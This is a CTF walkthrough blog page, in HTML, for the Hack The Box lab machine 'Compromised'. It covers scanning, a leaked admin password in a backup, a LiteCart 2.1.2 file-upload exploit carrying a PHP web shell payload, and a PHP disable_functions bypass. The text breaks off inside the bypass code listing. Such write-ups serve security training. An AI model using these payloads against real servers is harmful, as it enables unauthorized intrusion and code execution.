@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	12 Sep 2020IP:	10.10.10.207 User Blood xct	00 days, 03 hours, 35 mins, 20 seconds.Root Blood xct	00 days, 03 hours, 34 mins, 56 seconds.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[compromised]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/09/16/compromised/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	HardPoints:	40Release:	12 Sep 2020IP:	10.10.10.207 User Blood xct	00 days, 03 hours, 35 mins, 20 seconds.Root Blood xct	00 days, 03 hours, 34 mins, 56 seconds.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb92.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb93.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb94.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb95.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb96.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb97.jpg">
+<meta property="article:published_time" content="2020-09-16T08:38:41.000Z">
+<meta property="article:modified_time" content="2021-01-31T03:58:39.800Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb92.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/09/16/compromised/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/09/16/compromised/","path":"2020/09/16/compromised/","title":"Hack-The-Box-walkthrough[compromised]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[compromised] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-shell"><span class="nav-number">3.</span> <span class="nav-text">get shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#privilege-esclation"><span class="nav-number">4.</span> <span class="nav-text">privilege esclation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">4.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">4.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/09/16/compromised/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[compromised] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[compromised]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-09-16 16:38:41" itemprop="dateCreated datePublished" datetime="2020-09-16T16:38:41+08:00">2020-09-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-01-31 11:58:39" itemprop="dateModified" datetime="2021-01-31T11:58:39+08:00">2021-01-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Hard<br>Points:	40<br>Release:	12 Sep 2020<br>IP:	10.10.10.207</p>
+<p>User Blood xct	00 days, 03 hours, 35 mins, 20 seconds.<br>Root Blood xct	00 days, 03 hours, 34 mins, 56 seconds.</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb92.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.207</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>enumerate port 80 by looking at files&#x2F;directories:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ffuf<span class="comment"># ./ffuf -c -u http://10.10.10.207/FUZZ -w /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line">.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]</span><br><span class="line">.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]</span><br><span class="line">.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]</span><br><span class="line">backup                  [Status: 301, Size: 313, Words: 20, Lines: 10]</span><br><span class="line">index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]</span><br><span class="line">server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]</span><br><span class="line">shop                    [Status: 301, Size: 311, Words: 20, Lines: 10]</span><br></pre></td></tr></table></figure>
+
+<p>we find some interesting directories&#x2F;files, but the important one is the backup directory,<br>so visit the URL <span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjIwNy9iYWNrdXAv">http://10.10.10.207/backup/<i class="fa fa-external-link-alt"></i></span> and find out there is a file called a.tar.gz.</p>
+<p>download and extract backup file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.10.207/backup/a.tar.gz</span><br><span class="line">tar -xvf a.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>sort the contents by modification date:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">printf</span> <span class="string">&quot;%T@ %Tc %p\n&quot;</span> | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure>
+
+<p>look at latest modified files.<br>look at .&#x2F;admin&#x2F;login.php and find this line:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//file_put_contents(<span class="string">&quot;./.log2301c9430d8593ae.txt&quot;</span>, <span class="string">&quot;User: &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot; Passwd: &quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>look whats in there:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt</span></span><br><span class="line">User: admin Passwd: theNextGenSt0r3!~</span><br></pre></td></tr></table></figure>
+
+<p>got creds:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:theNextGenSt0r3!~</span><br></pre></td></tr></table></figure>
+
+<p>go to </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.207/shop/admin/</span><br></pre></td></tr></table></figure>
+
+<p>and login with the creds<br>see the version at the bottom left</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LiteCart 2.1.2</span><br></pre></td></tr></table></figure>
+<p>look for exploit with searchsploit:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># searchsploit LiteCart</span></span><br><span class="line">--------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                         |  Path</span><br><span class="line">--------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">LiteCart 2.1.2 - Arbitrary File Upload                                                 | php/webapps/45267.py</span><br><span class="line">--------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">root@kali:~/hackthebox/machine/compromised<span class="comment"># searchsploit -m php/webapps/45267.py</span></span><br><span class="line">  Exploit: LiteCart 2.1.2 - Arbitrary File Upload</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/45267</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/45267.py</span><br><span class="line">File Type: ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/hackthebox/machine/compromised/45267.py</span><br></pre></td></tr></table></figure>
+
+<p>run the exploit:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 45267.py -t http://10.10.10.207/shop/admin/ -p <span class="string">&#x27;theNextGenSt0r3!~&#x27;</span> -u admin</span><br></pre></td></tr></table></figure>
+
+<p>something went wrong, lets look at phpinfo,<br>edit the exploit from this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;</span><br><span class="line">        <span class="string">&#x27;vqmod&#x27;</span>: (rand + <span class="string">&quot;.php&quot;</span>, <span class="string">&quot;&lt;?php if( isset( <span class="variable">$_REQUEST</span>[&#x27;c&#x27;] ) ) &#123; system( <span class="variable">$_REQUEST</span>[&#x27;c&#x27;] . &#x27; 2&gt;&amp;1&#x27; ); &#125; ?&gt;&quot;</span>, <span class="string">&quot;application/xml&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>:one,</span><br><span class="line">        <span class="string">&#x27;upload&#x27;</span>:(None,<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>to this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;</span><br><span class="line">        <span class="string">&#x27;vqmod&#x27;</span>: (rand + <span class="string">&quot;.php&quot;</span>, <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>, <span class="string">&quot;application/xml&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>:one,</span><br><span class="line">        <span class="string">&#x27;upload&#x27;</span>:(None,<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>also, remove this at line 72, so we dont get the full html output of phpinfo in our terminal:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> r.content</span><br></pre></td></tr></table></figure>
+<p>run the exploit again, and we get an url to the phpinfo</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shell =&gt; http://10.10.10.207/shop/admin/../vqmod/xml/4YQVJ.php?c=<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p>open the url in your browser and search for “disable_functions”.<br>in there we see the disabled functions “system” and “shell_exec” and more which are preventing us to run commands :(</p>
+<p>disable_functions:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,passthru,popen,shell_exec,proc_open,<span class="built_in">exec</span>,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</span><br></pre></td></tr></table></figure>
+
+<p>but there is a bypass:</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9wYWNrZXRzdG9ybXNlY3VyaXR5LmNvbS9maWxlcy8xNTQ3MjgvUEhQLTcuMy1kaXNhYmxlX2Z1bmN0aW9ucy1CeXBhc3MuaHRtbA==">PHP-7.3-disable_functions-Bypass<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>so lets use this to get RCE.<br>first create the bypass.php file: (notice the change of the pwn function call)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span 